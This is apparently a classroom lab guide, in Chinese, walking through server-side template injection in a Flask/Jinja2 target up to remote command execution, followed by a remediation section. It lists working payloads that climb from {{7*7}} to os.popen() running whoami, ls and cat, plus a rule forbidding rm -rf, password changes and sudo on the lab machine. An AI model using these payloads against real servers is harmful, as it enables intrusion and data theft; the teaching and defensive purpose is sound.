SSTI to RCE

頁面把網址參數直接拼進模板字串，交由 Jinja2 模板引擎解析。攻擊者可從簡單的算式注入，沿物件鏈逐步取得 Python 的 os 模組，最終在伺服器上執行任意系統指令。

嚴重度 High   PORT 5002

漏洞原理

靶機以 render_template_string() 將使用者輸入直接拼進模板字串，輸入因此被 Jinja2 當成模板語法執行；加上 debug=True 未關閉，使攻擊面進一步放大。測試網址格式如下：

url format
http://<靶機網址>/?input=<payload>

操作步驟

  1. 確認輸入被輸出。頁面顯示 hello，代表參數會被回填。
    ?input=
    hello
  2. 確認存在 SSTI。頁面顯示 49 而非字串 7*7，代表輸入被當算式執行。
    ?input=
    {{7*7}}
  3. 判斷模板引擎。顯示 7777777，確認為 Jinja2（Python / Flask）。
    ?input=
    {{7*'7'}}
  4. 沿物件鏈取得 os 模組。逐層貼入，目的是從模板環境爬到 Python 內建函式。
    ?input= 逐層測試
    {{request}}
{{config}}
{{request.application.__globals__.__builtins__.__import__('os')}}
  5. 遠端指令執行 (RCE)。頁面回傳伺服器的使用者名稱，代表已能在伺服器上執行任意指令。
    RCE payload
    {{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
  6. 替換指令延伸操作。將 whoami 換成其他指令，例如列目錄或讀檔。
    列出目錄
    {{request.application.__globals__.__builtins__.__import__('os').popen('ls -a').read()}}
    讀取檔案
    {{request.application.__globals__.__builtins__.__import__('os').popen('cat surprise.txt').read()}}
課堂規則 取得 RCE 後請勿執行破壞性指令。不要 rm -rf、不要更改密碼、不要 sudo，以免靶機損壞影響其他學員。

防禦修補

不要把使用者輸入拼進模板字串，改用 render_template('檔案.html', 變數=...) 將輸入當成變數傳入。生產環境關閉 debug，並以沙箱與最小權限執行伺服器，即使發生 RCE 也難以擴大影響。

對照
# 漏洞寫法：輸入被拼進模板
render_template_string("Hello " + user_input)

# 正確寫法：輸入當變數傳入，不參與模板解析
render_template("index.html", name=user_input)
